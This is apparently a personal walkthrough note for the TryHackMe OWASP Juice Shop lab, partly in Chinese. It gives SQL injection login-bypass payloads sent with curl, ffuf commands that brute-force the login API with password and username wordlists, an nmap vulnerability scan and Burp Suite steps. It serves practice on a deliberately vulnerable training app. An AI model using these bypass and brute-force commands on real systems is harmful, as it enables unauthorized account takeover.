# OWASP Juice Shop

## link

[OWASP Juice Shop](https://tryhackme.com/room/owaspjuiceshop)

---

## package

```bash
kali:~ # apt install nmap
kali:~ # apt install seclists
kali:~ # apt install burpsuite
kali:~ # apt install ffuf
```

---

## SQL

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>';
-- =>

1. with username
-- ' OR 1=1 --
SELECT * FROM users WHERE username = '' OR 1=1 --AND password = '<password>';

2. with username
-- <username>' OR 1=1 --
SELECT * FROM users WHERE username = '<username>' OR 1=1 --AND password = '<password>';
```

## flow

```bash
kali:~ $ export target_ip=

# scan port
kali:~ $ nmap -Pn -sV --script vuln ${target_ip}

# SQL injection
kali:~ $ curl http://${target_ip}/rest/user/login \
 -X POST \
 -H 'Content-Type: application/json' \
 -H 'Accept: application/json' \
 --data-raw '{"email":"'\'' or 1=1 --","password":"any"}'

kali:~ $ curl http://${target_ip}/rest/user/login \
 -X POST \
 -H 'Content-Type: application/json' \
 -H 'Accept: application/json' \
 --data-raw '{"email":"admin@juice-sh.op'\'' or 1=1 --","password":"any"}'

export password_file=/usr/share/wordlists/seclists/Passwords/Common-Credentials/best1050.txt
export username_file=/usr/share/seclists/Usernames/top-usernames-shortlist.txt
# brute force web
kali:~ $ ffuf -u http://${target_ip}/rest/user/login \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
    -w ${password_file} \
    -mc 200

kali:~ $ ffuf -u http://${target_ip}/rest/user/login \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"email":"W1","password":"W2"}' \
    -w ${username_file}:W1 \
    -w ${password_file}:W2 \
    -mc 200
# 真實環境中，頻繁發送請求可能會導致 IP 被封鎖。測試時建議加上 -p 0.1 (延遲 0.1 秒) 來模擬正常流量。

# gui tool
kali:~ $ burpsuite
```

---

## burpsuite

- Target (目標範圍)
  自動記錄所有經過 Proxy 的流量，並以樹狀結構呈現。
  1. 在 Target > Site map 可以看到所有瀏覽過的網域與路徑。
  2. 右鍵點擊目標網站選擇 Add to scope，這可以讓 Burp 專注於該目標，過濾掉不相關的廣告或系統流量。

- Proxy (代理攔截)
  Burp 的核心門戶，所有流量都會先經過這裡。
  1. 在 Proxy > Intercept 標籤中，將 Intercept is on 開啟。
  2. 設定瀏覽器代理指向 Burp (預設 127.0.0.1:8080)。
  3. 當送出請求時，封包會「卡」在 Burp，可直接修改內容（例如修改 JSON Data）。
  4. 點擊 Forward，封包才會被送出。如點擊 Drop，該請求就會被捨棄。

- Intruder (入侵者/自動化攻擊)
  自動化的暴力破解或掃描工具。
  1. 右鍵選 Send to Intruder。
  2. 在 Positions 標籤定義要攻擊的欄位（例如 {"email":"§payload§"}）。
  3. 在 Payloads 標籤匯入字典檔（例如一堆 SQLi 字串或密碼清單）。
  4. 點擊 Start attack。

- Repeater (重發器)
  測試 API（例如 Login API）最常用的功能。
